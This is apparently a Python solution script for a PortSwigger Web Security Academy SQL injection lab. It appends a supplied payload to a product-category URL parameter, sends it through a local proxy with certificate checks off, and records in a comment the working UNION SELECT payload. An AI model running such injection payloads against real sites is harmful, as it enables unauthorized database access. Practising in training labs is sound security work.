#!/usr/bin/env python3
# Lab: SQL injection UNION attack, finding a column containing text
# Lab-Link: <https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text>  # noqa
# Difficulty: PRACTITIONER
# Correct payload: "' UNION (SELECT null,'<PROVIDED STRING>',null)--"
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def exploit(host, payload):
    url = f'{host}/filter?category=Accessories{payload}'
    print(f'[ ] Requesting {url}')
    r = requests.get(url, verify=False, proxies=proxies)
    if "Congratulations, you solved the lab!" in r.text:
        return True
    return False


if __name__ == "__main__":
    try:
        host = sys.argv[1].strip().rstrip('/')
        payload = sys.argv[2].strip()
    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <host> <payload>')
        print(f'[-] Example: {sys.argv[0]} http://www.example.com "\'--"')
        sys.exit(-1)

    if exploit(host, payload):
        print('[+] Injection successful')
    else:
        print('[-] Injection not successful')
